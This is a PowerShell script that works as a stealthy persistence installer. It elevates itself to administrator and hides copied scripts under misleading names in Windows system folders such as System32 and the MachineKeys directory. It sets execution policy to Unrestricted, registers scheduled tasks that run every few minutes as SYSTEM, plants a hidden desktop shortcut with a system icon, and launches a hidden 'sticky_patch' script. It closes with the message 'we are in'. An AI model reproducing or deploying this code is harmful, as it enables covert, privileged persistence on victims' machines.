# Self-Elevate to Administrator
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}


#  Define Target Paths
$taskScriptPath    = "$env:windir\System32\Com\en-US"
$logScriptPath     = "$env:windir\System32\Speech\Engines\TTS\en-US"
$oneTimeScriptPath = "$env:windir\security\database\winlogon_color"
$backupPath        = "$env:ProgramData\Microsoft\Crypto\RSA\MachineKeys"

# Ensure Directories Exist
foreach ($dir in @($taskScriptPath, $logScriptPath, $oneTimeScriptPath, $backupPath)) {
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
        attrib +h +s $dir
    }
}

# Copy and Hide Script Files
$scriptMap = @{
    "$taskScriptPath\sys_usr.ps1"         = ".\sys_usr.ps1"
    "$taskScriptPath\sys_win.ps1"         = ".\sys_win.ps1"
    "$logScriptPath\sys_log.ps1"          = ".\sys_log.ps1"
    "$oneTimeScriptPath\sticky_patch.ps1" = ".\sticky_patch.ps1"
    "$backupPath\win_ux.ps1"              = ".\sys_usr.ps1"
    "$backupPath\win_ui.ps1"              = ".\sys_win.ps1"
}

foreach ($dest in $scriptMap.Keys) {
    Copy-Item -Path $scriptMap[$dest] -Destination $dest -Force
    attrib +h +s $dest
}


#Set Execution Policy if wasnt set b4
try {
    Set-ExecutionPolicy Unrestricted -Force
} catch {
    Write-Host "Unable to set execution policy globally. Please ensure this is done manually."
}

# Register Scheduled Tasks (clean format)
schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$taskScriptPath\sys_usr.ps1`"" /RU SYSTEM
schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$taskScriptPath\sys_win.ps1`"" /RU SYSTEM

# Create Shortcut for sys_log
$shortcutPath = "$env:Public\Desktop\SystemService.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$logScriptPath\sys_log.ps1`""
$Shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,44"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
attrib +h $shortcutPath


# One-Time Execution: sticky_patch
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$oneTimeScriptPath\sticky_patch.ps1`""


Write-Host "`n we are in, repeat we are in"
